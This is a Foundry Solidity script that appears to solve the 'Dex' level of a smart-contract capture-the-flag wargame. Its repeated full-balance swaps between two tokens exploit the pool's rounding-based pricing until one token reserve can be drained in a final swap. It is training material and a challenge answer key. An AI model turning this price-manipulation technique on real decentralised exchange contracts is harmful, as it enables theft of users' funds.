// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/access/Ownable.sol";
import "../src/levels/22-Dex/Dex.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level22Solution is Script {
    Dex _dexInstance = Dex(payable(0x7A9b903e9359818562B7bD3cDdcAcBCEA21B4C5f));

    function priceLog(address token1, address token2, address wallet) public view {
        console.log("my token1 : ", _dexInstance.balanceOf(token1, wallet));
        console.log("my token2 : ", _dexInstance.balanceOf(token2, wallet));
        console.log("dex token1 : ", _dexInstance.balanceOf(token1, address(_dexInstance)));
        console.log("dex token2 : ", _dexInstance.balanceOf(token2, address(_dexInstance)));
    }
    

    function run() public{
        vm.startBroadcast();
        
        address token1 = _dexInstance.token1();
        address token2 = _dexInstance.token2();
        address myWallet = tx.origin;

        // 授权给_dexInstance
        _dexInstance.approve(address(_dexInstance), 200);
        console.log("---------------------   begin       ----------------------");
        priceLog(token1, token2, myWallet);

        bool token1_break = false;
        bool token2_break = false;
        uint256 swapAmount = 0;

        for(uint256 i =1;i<=100;i++) {
            console.log("---------------------   ", i, "rotation      ----------------------");
            // all token1 -> token2
            // 拉高了token2的价格

            swapAmount = _dexInstance.getSwapPrice(token1, token2, _dexInstance.balanceOf(token1, myWallet));
            if(swapAmount >=  _dexInstance.balanceOf(token2, address(_dexInstance))){
                token1_break = true;
                break;
            }
            _dexInstance.swap(token1, token2, _dexInstance.balanceOf(token1, myWallet));
            priceLog(token1, token2, myWallet);

            // all token2 -> token1
            // 拉高了token1的价格
            swapAmount = _dexInstance.getSwapPrice(token2, token1, _dexInstance.balanceOf(token2, myWallet));
            if(swapAmount >= _dexInstance.balanceOf(token1,address(_dexInstance))){
                token2_break = true;
                break;
            }
            _dexInstance.swap(token2, token1,  _dexInstance.balanceOf(token2, myWallet));
            priceLog(token1, token2, myWallet);
        }

        // final
        // 一次性清空
        console.log("---------------------   final       ----------------------");
        if(token1_break){
            _dexInstance.swap(token1, token2, _dexInstance.balanceOf(token1, address(_dexInstance)));
        }else if(token2_break){
            _dexInstance.swap(token2, token1,  _dexInstance.balanceOf(token2, address(_dexInstance)));
        }
        priceLog(token1, token2, myWallet);

        vm.stopBroadcast();
    }
}